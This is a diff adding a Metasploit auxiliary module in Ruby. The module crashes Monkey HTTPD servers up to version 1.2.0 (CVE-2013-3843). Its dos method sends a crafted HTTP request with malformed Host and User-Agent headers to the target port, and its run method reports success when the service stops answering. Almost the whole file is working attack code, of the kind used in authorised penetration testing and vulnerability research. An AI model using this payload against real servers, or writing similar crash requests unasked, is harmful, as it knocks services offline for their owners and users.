@@ -1,0 +1,79 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Dos
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Monkey HTTPD Header Parsing Denial of Service (DoS)',
+        'Description' => %q{
+          This module causes improper header parsing that leads to a segmentation fault
+          due to a specially crafted HTTP request. Affects version <= 1.2.0.
+        },
+        'Author' => [
+          'Doug Prostko <dougtko[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['CVE', '2013-3843'],
+          ['OSVDB', '93853'],
+          ['BID', '60333']
+        ],
+        'DisclosureDate' => '2013-05-30',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(2001)
+      ]
+    )
+  end
+
+  def dos
+    req = "GET / HTTP/1.1\r\n"
+    req << "Host:\r\n\r\nlocalhost\r\n"
+    req << "User-Agent:\r\n\r\n"
+
+    connect
+    sock.put(req)
+    disconnect
+  end
+
+  def is_alive?
+    begin
+      connect
+    rescue Rex::ConnectionRefused
+      return false
+    ensure
+      disconnect
+    end
+
+    true
+  end
+
+  def run
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending DoS packet...")
+    dos
+
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Checking server status...")
+    select(nil, nil, nil, 1)
+
+    if is_alive?
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Server is still alive")
+    else
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Connection Refused: Success!")
+    end
+  end
+end
